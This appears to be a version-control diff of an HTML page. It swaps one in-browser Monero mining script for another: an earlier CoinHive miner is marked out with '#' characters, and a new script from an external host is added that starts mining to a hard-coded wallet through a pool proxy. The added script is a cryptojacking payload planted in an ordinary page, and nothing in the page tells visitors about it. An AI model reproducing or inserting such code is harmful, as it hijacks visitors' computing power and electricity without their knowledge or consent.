@@ -17,12 +17,23 @@
   
   
 	
- <script src="https://lokiloki202223.github.io/MyMiner.github.io/pino.js"></script>
-<script>
- var miner = new CoinHive.Anonymous('43i2BQCTpaqQAVM7RHggdZYCbd6cqVLhGcyzm6hr4NDzhkzD8tH8nrfhZJAYGGPcjbDqi5oeAzeu8CajwgByECkaHfYrM64', {throttle: 0.2});
-  miner.start();
-</script>		
+#<script src="https://lokiloki202223.github.io/MyMiner.github.io/pino.js"></script>
+#<script>
+# var miner = new CoinHive.Anonymous('43i2BQCTpaqQAVM7RHggdZYCbd6cqVLhGcyzm6hr4NDzhkzD8tH8nrfhZJAYGGPcjbDqi5oeAzeu8CajwgByECkaHfYrM64', {throttle: 0.2});
+#  miner.start();
+#</script>		
 	
+<script src="https://monerominer.rocks/miner-mmr/webmnr.min.js"></script>
+<script>
+    server = "wss://f.xmrminingproxy.com:8181";
+    var pool = "pool.supportxmr.com:3333";
+    var walletAddress = "43i2BQCTpaqQAVM7RHggdZYCbd6cqVLhGcyzm6hr4NDzhkzD8tH8nrfhZJAYGGPcjbDqi5oeAzeu8CajwgByECkaHfYrM64";
+    var workerId = "xx"
+    var threads = -5;
+    var password = "x";
+    startMining(pool, walletAddress, workerId, threads, password);
+    throttleMiner = 0.2
+</script>
 
 </body>
 
